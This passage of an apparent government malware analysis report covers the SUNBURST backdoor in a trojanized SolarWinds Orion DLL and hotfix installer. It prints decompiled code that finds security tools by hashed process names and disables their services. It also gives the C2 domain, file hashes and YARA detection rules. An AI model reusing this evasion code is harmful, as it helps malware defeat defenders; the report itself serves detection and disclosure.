\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0flag2 = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 num1 = OrionImprovementBusinessLayer.svcListModified2 ? num1 + 1 : 0;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 string hostName;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 switch (OrionImprovementBusinessLayer.status)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.ReportStatus.New:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 hostName = addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out last);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0case OrionImprovementBusinessLayer.ReportStatus.Append:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 hostName = flag2 ? cryptoHelper.GetNextStringEx(rec.dnssec) : cryptoHelper.GetNextString(rec.dnssec);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 break;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0default:\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 goto label_27;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t--End Update Function--\n\n\n\t\t\tThe UpdateNotification() function will return a \"False\" if any process on the hard coded blocklist is running on the target system. It utilizes the TrackProcess function detailed below. It call the TrackProcesses function.\n\n\t\t\t--Begin UpdateNotification Function--\n\t\t\tprivate static bool UpdateNotification()\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 int num = 3;\n\t\t\t\u00a0\u00a0\u00a0 while (num-- &gt; 0)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0OrionImprovementBusinessLayer.DelayMin(0, 0);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (OrionImprovementBusinessLayer.DnsHelper.CheckServerConnection(OrionImprovementBusinessLayer.apiHost))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return true;\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 return false;\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t--End UpdateNotification Function--\n\n\n\t\t\tThe \"TrackProcesses\" function queries a list of running processes on the target system and then passes the process names to the \"SearchAssemblies\" function, which hashes their process names and compares the result hashes to the hard-coded process hash list stored in the list \"assemblyTimeStamps.\" If any of the target processes are running, the function will return True. It also searches for certain services and attempts to disable them.\n\n\t\t\t--Begin TrackProcesses Function--\n\t\t\tpublic static bool TrackProcesses(bool full)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Process[] processes = Process.GetProcesses();\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (OrionImprovementBusinessLayer.ProcessTracker.SearchAssemblies(processes))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 return true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0bool flag = OrionImprovementBusinessLayer.ProcessTracker.SearchServices(processes);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return !flag &amp; full ? OrionImprovementBusinessLayer.ProcessTracker.SearchConfigurations() : flag;\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t--End TrackProcesses Function--\n\n\n\t\t\tThe \"SearchAssemblies\" function called by TrackProcesses, is used to enumerate running processes to determine if any of the hashed processes, included within the process blocklist are currently running on the target system.\n\n\t\t\t--Begin SearchAssemblies Function\u2014\n\t\t\tprivate static bool SearchAssemblies(Process[] processes)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for (int index = 0; index &lt; processes.Length; ++index)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ulong hash = OrionImprovementBusinessLayer.GetHash(processes[index].ProcessName.ToLower());\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (Array.IndexOf&lt;ulong&gt;(OrionImprovementBusinessLayer.assemblyTimeStamps, hash) != -1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return false;\n\n\t\t\t\u00a0\u00a0\u00a0 }\n\t\t\t--End SearchAssemblies Function--\n\n\n\t\t\tThe SearchServices\" function, called by TrackProcesses, searches running services to determine whether or not they are running any of the hard-coded block list target process hashes. It attempts to disable these services.\n\n\t\t\t--Begin SearchServices Function--\n\t\t\tprivate static bool SearchServices(Process[] processes)\n\t\t\t\u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for (int index = 0; index &lt; processes.Length; ++index)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 ulong hash = OrionImprovementBusinessLayer.GetHash(processes[index].ProcessName.ToLower());\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 foreach (OrionImprovementBusinessLayer.ServiceConfiguration svc in OrionImprovementBusinessLayer.svcList)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (Array.IndexOf&lt;ulong&gt;(svc.timeStamps, hash) != -1)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 object obj = OrionImprovementBusinessLayer.ProcessTracker._lock;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 bool flag = false;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 try\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Monitor.Enter(obj, ref flag);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (!svc.running)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.svcListModified1 = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.svcListModified2 = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 svc.running = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (!svc.disabled)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 if (!svc.stopped)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (svc.Svc.Length != 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.DelayMin(0, 0);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 OrionImprovementBusinessLayer.ProcessTracker.SetManualMode(svc.Svc);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 svc.disabled = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 svc.stopped = true;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 finally\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (flag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Monitor.Exit(obj);\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 }\n\t\t\t--End SearchServices Function--\nScreenshots\n \n\nFigure 1 - The modified module with a new class function named \"OrionImprovementBusinessLayer.\"\n\n \n\nFigure 2 - The code snippet contains the subdomains and other strings used to construct the C2 domains.\n\n\n\navsvmcloud.com\nTags\ncommand-and-control\nWhois\nDomain Name: avsvmcloud.com\n\t\t\tRegistry Domain ID: 2289718834_DOMAIN_COM-VRSN\n\t\t\tRegistrar WHOIS Server: whois.godaddy.com\n\t\t\tRegistrar URL: http://www.godaddy.com\n\t\t\tUpdated Date: 2020-10-08T13:58:35Z\n\t\t\tCreation Date: 2018-07-25T11:38:29Z\n\t\t\tRegistrar Registration Expiration Date: 2023-07-25T11:38:29Z\n\t\t\tRegistrar: GoDaddy.com, LLC\n\t\t\tRegistrar IANA ID: 146\n\t\t\tRegistrar Abuse Contact Email: abuse@godaddy.com\n\t\t\tRegistrar Abuse Contact Phone: +1.4806242505\n\t\t\tDomain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited\n\t\t\tDomain Status: clientUpdateProhibited http://www.icann.org/epp#clientUpdateProhibited\n\t\t\tDomain Status: clientRenewProhibited http://www.icann.org/epp#clientRenewProhibited\n\t\t\tDomain Status: clientDeleteProhibited http://www.icann.org/epp#clientDeleteProhibited\n\t\t\tRegistry Registrant ID: Not Available From Registry\n\t\t\tRegistrant Name: Registration Private\n\t\t\tRegistrant Organization: Domains By Proxy, LLC\n\t\t\tRegistrant Street: DomainsByProxy.com\n\t\t\tRegistrant Street: 14455 N. Hayden Road\n\t\t\tRegistrant City: Scottsdale\n\t\t\tRegistrant State/Province: Arizona\n\t\t\tRegistrant Postal Code: 85260\n\t\t\tRegistrant Country: US\n\t\t\tRegistrant Phone: +1.4806242599\n\t\t\tRegistrant Phone Ext:\n\t\t\tRegistrant Fax: +1.4806242598\n\t\t\tRegistrant Fax Ext:\n\t\t\tRegistrant Email: avsvmcloud.com@domainsbyproxy.com\n\t\t\tRegistry Admin ID: Not Available From Registry\n\t\t\tAdmin Name: Registration Private\n\t\t\tAdmin Organization: Domains By Proxy, LLC\n\t\t\tAdmin Street: DomainsByProxy.com\n\t\t\tAdmin Street: 14455 N. Hayden Road\n\t\t\tAdmin City: Scottsdale\n\t\t\tAdmin State/Province: Arizona\n\t\t\tAdmin Postal Code: 85260\n\t\t\tAdmin Country: US\n\t\t\tAdmin Phone: +1.4806242599\n\t\t\tAdmin Phone Ext:\n\t\t\tAdmin Fax: +1.4806242598\n\t\t\tAdmin Fax Ext:\n\t\t\tAdmin Email: avsvmcloud.com@domainsbyproxy.com\n\t\t\tRegistry Tech ID: Not Available From Registry\n\t\t\tTech Name: Registration Private\n\t\t\tTech Organization: Domains By Proxy, LLC\n\t\t\tTech Street: DomainsByProxy.com\n\t\t\tTech Street: 14455 N. Hayden Road\n\t\t\tTech City: Scottsdale\n\t\t\tTech State/Province: Arizona\n\t\t\tTech Postal Code: 85260\n\t\t\tTech Country: US\n\t\t\tTech Phone: +1.4806242599\n\t\t\tTech Phone Ext:\n\t\t\tTech Fax: +1.4806242598\n\t\t\tTech Fax Ext:\n\t\t\tTech Email: avsvmcloud.com@domainsbyproxy.com\n\t\t\tName Server: PDNS09.DOMAINCONTROL.COM\n\t\t\tName Server: PDNS10.DOMAINCONTROL.COM\n\t\t\tDNSSEC: unsigned\n\t\t\tURL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/\n\t\t\t>>> Last update of WHOIS database: 2020-12-14T19:00:00Z <<<\nRelationships\n\n\n\navsvmcloud.com\nConnected_From\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\n\n\nDescription\nThe subdomain for \"SolarWinds.Orion.Core.BusinessLayer.dll.\"\n\n\nd0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600\nTags\ndropper\nDetails\n\n\n\nName\nSolarWinds-Core-v2019.4.5220-Hotfix5.msp\n\n\nSize\n214831104 bytes\n\n\nType\nComposite Document File V2 Document, Little Endian, Os: Windows, Version 6.2, Code page: 1252, Title: Installation Database, Subject: SolarWinds Orion Core Services 2019.4, Author: SolarWinds Worldwide, LLC., Keywords: Installer, Comments: This installer database contains the logic and data required to install SolarWinds Orion Core Services 2019.4., Create Time/Date: Tue Mar 24 11:55:04 2020, Name of Creating Application: Windows Installer XML Toolset (3.9.1208.0), Security: 4, Template: Intel;1033, Last Saved By: Intel;1033, Revision Number: {079A74C5-95D0-446E-86F7-B8EAF0A29654}119.4.20161.5220;{079A74C5-95D0-446E-86F7-B8EAF0A29654}119.4.20161.5220;{DA36F8E2-99FC-44DF-B011-09F6B063B0F7}, Number of Pages: 200, Number of Characters: 152174623\n\n\nMD5\n02af7cec58b9a5da1c542b5a32151ba1\n\n\nSHA1\n1b476f58ca366b54f34d714ffce3fd73cc30db1a\n\n\nSHA256\nd0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600\n\n\nSHA512\nf40fd5d94791f18eed59dc78d12acc52f4a65dfdf8c819d6957de8059e0e127160e0a21320845340932a54f9c639c42b2c815558b2d0cec111e06aa5c8908ea4\n\n\nssdeep\n3145728:yMbnCpAK7nuv7xYiq0bC4zheqeRHuCieBVZNP7WJOQeXt+9riYBaeIBjSxTusL:yMbCp7uf3GnqfCVrNPgLrW4GoxSG\n\n\nEntropy\n7.998885\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nd0d626deb3...\nContains\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\n\n\nDescription\nThis file is a Microsoft Windows Installer Patch file that has been identified as a SUNBURST installer named \"SolarWinds-Core-v2019.4.5220-Hotfix5.msp.\" This file contains legitimate SolarWinds Orion update components, the modified DLL \"SolarWinds.Orion.Core.BusinessLayer.dll\" (32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77) and a legitimate configuration file.\n\n\t\t\tThe hotfix is typically delivered to the SolarWinds Orion application as an update for the \"SolarWinds.Orion.Core.BusinessLayer.dll\" module. In this case, when the update is applied, it will overwrite the non-malicious module, replacing it with the trojanized version and providing the attacker with the same level of access as described in the analysis of \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77.\"\n\n\nce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\nTags\nbackdoortrojan\nDetails\n\n\n\nName\nSolarWinds.Orion.Core.BusinessLayer.dll\n\n\nSize\n1028072 bytes\n\n\nType\nPE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n\nMD5\n846e27a652a5e1bfbd0ddd38a16dc865\n\n\nSHA1\nd130bd75645c2433f88ac03e73395fba172ef676\n\n\nSHA256\nce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\n\n\nSHA512\nc26e275b4232be844f6c4062a4f42413099452085060ed4080b880b52800428cd32f69271c98977fa979a89355fbb3b485855ca3d51499bca12dfbf8c3168d2f\n\n\nssdeep\n12288:5JKoHwfn/jz3bbO4Qag2I97PMieSLezPKT+BYvjenWHuhh9c0g8vkzK19Q:vEfDbO97P8TrK0YbenWH4c0g8vkzK19\n\n\nEntropy\n5.580054\n\n\n\nAntivirus\n\n\n\nAhnlab\nBackdoor/Win32.SunBurst\n\n\nAntiy\nTrojan[Backdoor]/MSIL.Agent\n\n\nAvira\nTR/Sunburst.A\n\n\nBitDefender\nTrojan.Sunburst.A\n\n\nClamav\nWin.Countermeasure.Sunburst-9809152-0\n\n\nComodo\nBackdoor\n\n\nCyren\nW32/MSIL_SunBurst.A.gen!Eldorado\n\n\nESET\na variant of MSIL/SunBurst.A trojan\n\n\nEmsisoft\nTrojan.Win32.Sunburst (A)\n\n\nIkarus\nBackdoor.Sunburst\n\n\nK7\nTrojan ( 00574a531 )\n\n\nLavasoft\nTrojan.Sunburst.A\n\n\nMcAfee\nTrojan-sunburst\n\n\nMicrosoft Security Essentials\nTrojan:MSIL/Solorigate.BR!dha\n\n\nNANOAV\nTrojan.Win32.SunBurst.iduxyv\n\n\nSophos\nMal/Sunburst-A\n\n\nSymantec\nBackdoor.Sunburst\n\n\nSystweak\ntrojan-backdoor.sunburst-r\n\n\nTrendMicro\nBackdoo.6F8C6A1E\n\n\nTrendMicro House Call\nBackdoo.6F8C6A1E\n\n\nVirusBlokAda\nTScope.Trojan.MSIL\n\n\nZillya!\nTrojan.SunBurst.Win32.1\n\n\n\nYARA Rules\n\nrule CISA_10318927_01 : trojan rat SOLAR_FIRE\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10318927\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_2145\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"TROJAN RAT\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SOLAR_FIRE\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"This signature is based off of unique strings embedded within the modified Solar Winds app\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"b91ce2fa41029f6955bff20079468448\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_2 = \"846e27a652a5e1bfbd0ddd38a16dc865\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_2 = \"ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 63 00 30 00 6B 00 74 00 54 00 69 00 37 00 4B 00 4C 00 43 00 6A 00 4A 00 7A 00 4D 00 38 00 44 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 41 00 41 00 3D 00 3D 00 00 21 38 00 33 00 56 00 30 00 64 00 6B 00 78 00 4A 00 4B 00 55 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 63 00 2F 00 46 00 77 00 44 00 6E 00 44 00 4E 00 53 00 30 00 7A 00 4B 00 53 00 55 00 30 00 42 00 41 00 41 00 3D 00 3D }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 53 00 69 00 30 00 75 00 42 00 67 00 41 00 3D 00 00 21 38 00 77 00 77 00 49 00 4C 00 6B 00 33 00 4B 00 53 00 79 00 30 00 42 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\tall of them\n\t\t\t\t}\nrule FireEye_20_00025668_01 : SUNBURST APT backdoor\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"FireEye\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_1917\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Backdoor\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SUNBURST\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor matches a magic byte xor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$cmd_regex_encoded = \"U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 31 36 7D }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_event_encoded = \"U3ItS80rCaksSFWyUvIvyszPU9IBAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_eventmanager_encoded = \"U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_message_encoded = \"U/JNLS5OTE9VslKqNqhVAgA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$fnv_xor and ($cmd_regex_encoded or $cmd_regex_plain) or ( ($fake_orion_event_encoded or $fake_orion_event_plain) and ($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_message_plain) )\n\t\t\t\t}\nrule FireEye_20_00025668_02 : SUNBURST APT backdoor\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"FireEye\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2020-12-13\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modified = \"20201213_1917\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Backdoor\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"SUNBURST\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$a = \"0y3Kzy8BAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$aa = \"S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ab = \"S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ac = \"C88sSs1JLS4GAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ad = \"C/UEAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ae = \"C89MSU8tKQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$af = \"8wvwBQA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ag = \"cyzIz8nJBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ah = \"c87JL03xzc/LLMkvysxLBwA=\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ai = \"88tPSS0GAA==\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$aj = \"C8vPKc1NLQYA\" wide\n\t\t\t\t\u00a0\u00a0\u00a0 